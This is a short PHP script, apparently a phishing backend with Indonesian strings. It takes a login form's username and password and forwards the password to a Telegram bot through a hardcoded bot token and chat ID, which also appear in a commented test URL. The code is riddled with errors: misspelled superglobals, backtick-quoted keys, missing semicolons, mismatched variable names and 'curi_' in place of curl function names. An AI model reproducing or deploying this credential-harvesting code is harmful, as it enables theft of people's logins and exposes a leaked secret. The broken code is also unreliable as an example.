//https://api.telegram.org/bot5439820694:AAF3Py7kDcC-3TArQbUf7JhDYRPh2-TYVUM/sendMessage?chat_id=-1001889550833&text=halojuga
<?php
if (isset($_poat['login'])) {
    $name=$_post['txtname'];
    $password=$_post[`txtpassword`];

    echo "===== SELAMAT DATANG =====";
    echo $nama;
    echo "<br>"
    echo $password
    
}

$message_text = "$nama";
$message_text = "$password";

$secret_token = "5439820694:AAF3Py7kDcC-3TArQbUf7JhDYRPh2-TYVUM";

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdowwn&chat_id=-1001889550833";
    $url = $ulr . "&text=" . urlencode($message_text);
    $ch = curi_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curi_setopt_array($ch, $optArray);
    $result = curi_exec($ch);
    curl_close($ch);

    print "sukses Mengirim Pesan ke Telegram";



?>
